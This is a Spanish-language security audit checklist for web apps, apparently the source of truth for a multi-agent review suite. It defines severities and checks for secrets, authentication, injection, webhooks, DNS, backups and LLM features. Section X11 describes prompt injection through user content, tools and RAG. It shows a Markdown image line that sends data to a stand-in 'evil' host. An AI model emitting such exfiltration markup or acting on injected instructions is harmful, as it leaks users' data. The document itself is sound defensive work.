# SecurityChecks — los 20 chequeos + extras

Fuente única de verdad de la suite. Cada chequeo tiene **severidad fija** (la que se usa si falla) para que
los reportes sean comparables entre corridas. La suite solo puede **subirla o bajarla un nivel** y debe decir por qué.

Severidades: **CRÍTICA** explotable ya, sin condiciones, impacto grave (bloquea despliegue) ·
**ALTA** explotable con alguna condición o impacto serio (arreglar antes de producción) ·
**MEDIA** requiere condiciones específicas (arreglar pronto) · **BAJA** endurecimiento.

Estados por chequeo: ✅ cumple · ❌ falla · ⚠️ parcial · N/A no aplica (decir por qué) · ❓ no verificable desde código ni en vivo (pregunta concreta al usuario).

## Reparto

| Agente | Chequeos |
|---|---|
| `infra-secretos` | 1, 2, 3, 16, 17, 19, 20, X5, X6, X7, X8, X9, X12 |
| `acceso` | 4, 5, 6, 10, 11, 12, X4, X10 |
| `entradas` | 7, 8, 9, 13, 14, 15, 18, X1, X2, X3, X11 |
| `pentester` | confirma en vivo cualquier chequeo; dueño en vivo de 11, 16, 17, 18; herramientas: matriz de permisos (4–6), JWT (5), carrera y flujos (X4), fuzzing (7, 19), códigos cortos (11), webhook sin firma (X10), chatbot (X11) |

---

## Secretos

**1. Ocultar API keys — CRÍTICA.** Ninguna clave privada en código que llega al navegador o app móvil
(JS, HTML, bundles, variables `PUBLIC_*` `VITE_*` `NEXT_PUBLIC_*`, `dist/`). Solo claves públicas por diseño
(sitekey de Turnstile, anon key con RLS). APIs de pago solo desde el servidor.

**2. Variables de entorno — ALTA.** Secretos en `.env` / gestor de secretos del hosting / `wrangler secret`;
nunca en código ni en `docker-compose.yml` versionado. `.env.example` sin valores reales. La app **falla al arrancar**
si falta un secreto (nada de `SECRET_KEY="changeme"` por defecto).

**3. Keys en git — CRÍTICA.** Revisar el **historial completo**, no solo el árbol (`gitleaks git`). Un secreto que
estuvo en cualquier commit está comprometido aunque se haya borrado después → **rotarlo** es obligatorio.
`.gitignore` cubre `.env*`, `*.pem`, `*.key`, `credentials*.json`, bases de datos con datos reales.
`.dockerignore` existe y excluye `.env` y `.git`.

## Acceso

**4. Proteger ruta admin — CRÍTICA.** Paneles admin/dueño detrás de auth **verificada en el servidor** + rol.
Ocultar el enlace o usar una ruta rara no cuenta. Ideal: además Cloudflare Access / VPN / IP allowlist.

**5. Agregar auth — CRÍTICA.** Cada endpoint que lee o cambia datos privados exige sesión. Contraseñas con
argon2id o bcrypt (MD5/SHA1/SHA256 sin KDF = falla ALTA). Sesiones con expiración, invalidadas al cerrar sesión
o cambiar contraseña. Login/recuperación sin revelar si el usuario existe.

**6. Permisos de usuario — CRÍTICA.** Autorización por recurso (sin IDOR): toda consulta con un ID de la petición
filtra también por el usuario/negocio autenticado. El rol sale del servidor, nunca del body, query ni headers.
Multi-tenant: aislamiento por tenant en cada consulta.

**10. Reglas de la DB — ALTA.** Acceso directo desde cliente (Supabase, Firebase) → RLS/reglas en **todas** las
tablas. Usuario de DB de la app sin superusuario ni DDL. Retención y borrado real de datos personales.

**11. Rate limiting — ALTA.** Login, registro, recuperación, envío de códigos/SMS/WhatsApp/correo, formularios
públicos y endpoints caros (LLM, exportaciones). Por IP **real** (detrás de Cloudflare: `CF-Connecting-IP` de un proxy
confiable) y por cuenta. Formularios públicos con anti-bot (Turnstile).
**Códigos cortos** (OTP de 4–6 dígitos, códigos de recuperación, de verificación de correo, cupones o PIN): límite de
intentos **por código** (≤ 5, luego se invalida y hay que pedir otro), caducidad corta (≤ 10 min), comparación en tiempo
constante y el mismo límite aunque el atacante cambie de IP. Un código de 6 dígitos sin límite de intentos se
adivina con un script → CRÍTICA si da acceso a la cuenta.

**12. Límite de gasto — ALTA.** Toda API de pago con tope y alerta en el proveedor + límite por usuario en la app.
Endpoints que gastan dinero nunca anónimos. El tope del proveedor no se ve en el código → ❓ con pregunta.

## Entradas

**7. Sanitizar inputs — ALTA.** Validación en servidor con esquema (Pydantic/zod): tipos, longitudes, rangos.
Rechazar campos extra (`extra="forbid"`) → evita **mass assignment** (`rol`, `is_admin`, `puntos`, `precio`).
Si el mass assignment da privilegios → CRÍTICA (también es 6).

**8. Protección XSS — ALTA.** Sin `innerHTML`, `set:html`, `dangerouslySetInnerHTML`, `v-html`, `|safe`,
`mark_safe`, `Markup()` con datos de usuario. HTML de usuario → DOMPurify / nh3. CSP como segunda capa.

**9. Evitar SQL injection — CRÍTICA.** Solo consultas parametrizadas u ORM. Nada de f-strings, `%`, `.format()`
ni concatenación con datos de usuario. Identificadores dinámicos (`ORDER BY`, nombres de tabla) solo por lista blanca.

**13. Asegurar subidas — ALTA (CRÍTICA si permite escribir fuera del directorio o ejecutar).** Tipo real por
magic bytes, tamaño máximo, nombre generado por el servidor (nunca `filename` del cliente), guardado fuera del
webroot o en almacenamiento de objetos, imágenes re-codificadas, SVG rechazado o sanitizado.

**14. Protección CSRF — ALTA.** Auth por cookie → `SameSite=Lax/Strict` + token CSRF o verificación de `Origin`
en métodos que cambian estado. **Ninguna acción que cambie estado por GET.**

**15. Revisar CORS — ALTA.** Nunca `*` (ni reflejar el `Origin` sin validar) junto con credenciales.
Lista explícita de orígenes.

**18. Asegurar cookies — ALTA.** Sesión con `HttpOnly`, `Secure`, `SameSite`, `Max-Age` razonable, prefijo
`__Host-` cuando se pueda. Tokens de sesión fuera de `localStorage`.

## Infraestructura

**16. Habilitar HTTPS — ALTA.** Todo por HTTPS; http → 301 a https; Cloudflare SSL en Full (strict), nunca Flexible;
sin contenido mixto. Solo verificable en vivo o preguntando.

**17. Headers de seguridad — MEDIA.** `Content-Security-Policy`, `Strict-Transport-Security` (max-age ≥ 15552000),
`X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`, `frame-ancestors`/`X-Frame-Options`.
Sin `Server`/`X-Powered-By` con versión.

**19. Quitar modo debug — ALTA (CRÍTICA si expone secretos).** `DEBUG` apagado, sin `--reload`, sin stack traces
al cliente, sin endpoints `/debug` `/test` `/seed`. FastAPI `/docs` `/redoc` `/openapi.json` apagados en producción
salvo decisión explícita.

**20. Config de producción — ALTA.** Dependencias sin CVE conocidas (`pip-audit`, `npm audit`), lockfile versionado,
contenedor como usuario no root e imagen slim, puertos de DB/Redis/paneles **no** publicados, sin contraseñas por
defecto, respaldos configurados y probados (que además resistan un ransomware: ver X12), logs sin secretos ni
datos personales completos.

## Extras (lo que un senior revisa aunque no esté en la lista)

**X1. SSRF — ALTA.** Peticiones del servidor a URLs que controla el usuario (vistas previas, webhooks, importar
por URL) → lista blanca de hosts, bloquear IPs privadas/metadatos, sin seguir redirecciones a internas.

**X2. Deserialización / ejecución — CRÍTICA.** `pickle`, `yaml.load` sin SafeLoader, `eval`, `exec`,
`subprocess(shell=True)`, `child_process.exec`, plantillas renderizadas desde texto del usuario.

**X3. Path traversal / open redirect — ALTA/MEDIA.** Rutas de archivo o redirecciones construidas con datos del usuario.

**X4. Lógica de negocio — ALTA.** Condiciones de carrera en saldos/puntos/canjes, pasos de un flujo que se pueden
saltar, precios, descuentos o cantidades que manda el cliente (el total se recalcula en el servidor desde la base),
cupones y códigos reutilizables o canjeables en paralelo. Webhooks de pago → X10. Funciones con LLM → X11.

**X5. CI/CD y cadena de suministro — MEDIA.** Workflows de GitHub Actions con `pull_request_target` + checkout del
PR, acciones sin fijar, secretos expuestos a forks, scripts `postinstall` sospechosos.

**X6. Registro y monitoreo — MEDIA (ALTA si no hay ningún registro de autenticación ni de acciones de admin).**
Un ataque típico pasa semanas adentro sin que nadie lo vea. Mínimo:
- Se registran logins (éxito y fallo), recuperación de contraseña, cambios de rol/correo/contraseña, acciones de admin,
  pagos y webhooks recibidos, con usuario, IP real y hora, **sin** contraseñas, tokens ni datos personales completos.
- Los logs salen del servidor (proveedor de logs, Cloudflare Logpush, syslog remoto): un atacante con el servidor
  no debe poder borrarlos. Retención ≥ 90 días.
- Alertas: caída (monitor de uptime), picos de errores 5xx, ráfagas de logins fallidos, nuevo admin creado.
Lo que no se ve en el código (retención, alertas del proveedor) → ❓ con pregunta.

**X7. Superficie de ataque — ALTA si hay takeover o un entorno interno expuesto.** Subdominios descubiertos por
Certificate Transparency y nombres típicos (`scripts/subdominios.sh`): ningún staging/dev/admin/panel público sin
Access; ningún CNAME colgante (subdomain takeover); cada host público está en el inventario del dueño.

**X8. Correo y DNS — ALTA si el dominio no tiene SPF ni DMARC; MEDIA con `p=none`.** (`scripts/correo-dns.sh`)
SPF con `-all` (o `~all` + DMARC estricto), DMARC `p=quarantine`/`reject`, DKIM del proveedor, registro CAA y DNSSEC.
Dominio que no envía correo: `v=spf1 -all` + `v=DMARC1; p=reject`. Sin esto cualquiera manda correo "de" tu dominio.

**X9. Políticas de Cloudflare Access — CRÍTICA si una app queda abierta a cualquiera.** (`scripts/revisar-access.py`)
En Access, **Include** es «o»: si trae `Everyone`, un método de login (One-time PIN, GitHub…), un dominio público
(`gmail.com`) o un grupo con eso, la lista de correos de al lado no protege nada. Lo que acota va en **Require** o se quita.
Ejemplo típico: Include = [One-time PIN, 3 correos] → cualquier correo entra al panel «protegido».

**X10. Webhooks de pago — CRÍTICA.** Un endpoint que marca pedidos como pagados, acredita saldo o activa planes
cuando llega un webhook (Stripe, Mercado Pago, PayPal, Conekta, Lemon Squeezy, Paddle…). Si cualquiera puede mandarle
un POST, cualquiera se marca como pagado. Debe:
- **verificar la firma** con el secreto del webhook y el cuerpo **crudo** (Stripe `construct_event`/`constructEvent`,
  Mercado Pago `x-signature` HMAC-SHA256, PayPal `verify-webhook-signature`), con comparación en tiempo constante y
  ventana de tiempo (rechaza eventos de hace > 5 min);
- o, si el proveedor no firma, **volver a consultar el pago a su API** con el ID del evento antes de dar nada;
- ser **idempotente** (guardar el ID del evento; el mismo evento dos veces = una sola acreditación);
- confirmar **monto, moneda y pedido** contra la base (no confiar en el monto del evento sin cruzarlo);
- nunca aceptar "pagado" desde el navegador (la página de éxito `?status=approved` no prueba nada).
El secreto del webhook va en variables de entorno (chequeo 2), separado por entorno (test/producción).

**X11. Funciones con LLM (chatbots, asistentes, agentes) — ALTA (CRÍTICA si filtra datos de otros usuarios o
ejecuta acciones).** Todo texto que llega al modelo (el mensaje, un documento, una página, un correo, una reseña)
puede traer instrucciones. Revisa:
- **System prompt sin secretos**: ni claves, ni códigos de descuento internos, ni datos de clientes. Hay que suponer
  que se filtra.
- **Herramientas (tools/function calling)**: cada herramienta aplica la autorización del **usuario de la sesión**
  en el servidor (no la que diga el modelo); IDs ajenos → rechazo. Acciones que cambian datos o gastan dinero
  (reembolsos, descuentos, cambiar rol, enviar correos) piden confirmación del usuario o están fuera del alcance del modelo.
- **RAG / memoria**: los documentos recuperados se filtran por usuario/tenant **antes** de dárselos al modelo.
- **Salida del modelo = dato no confiable**: nunca a `innerHTML`/`v-html`/`|safe`, SQL, shell, `eval` ni URLs que el
  servidor visite (chequeos 8, 9, X1, X2). Markdown con imágenes remotas puede exfiltrar datos (`![](https://evil/?d=…)`).
- **Gasto**: endpoint con sesión, rate limit y `max_tokens` (chequeos 11 y 12).
Las defensas tipo "no obedezcas instrucciones del usuario" en el prompt **no cuentan** como control.

**X12. Respaldos a prueba de ransomware — ALTA.** El ransomware cifra o borra el servidor **y** los respaldos que
alcanza. Un respaldo cuenta solo si:
- se hace automático (diario o mejor) y **se probó restaurarlo** (fecha de la última prueba);
- hay una copia **fuera del servidor** y en otra cuenta/proveedor;
- es **inmutable o de solo agregar**: Object Lock / retención en S3, R2 o B2, snapshots con bloqueo, o credenciales
  que pueden escribir pero **no borrar**; las credenciales del respaldo no están en el servidor de la app con
  permiso de borrado;
- tiene versiones de varios días (un cifrado detectado tarde no se lleva todas las copias);
- las cuentas del hosting, la base y el almacenamiento tienen 2FA.
Casi nada de esto se ve en el código → ❓ con preguntas concretas (dónde, cada cuánto, quién puede borrarlos,
última restauración probada).
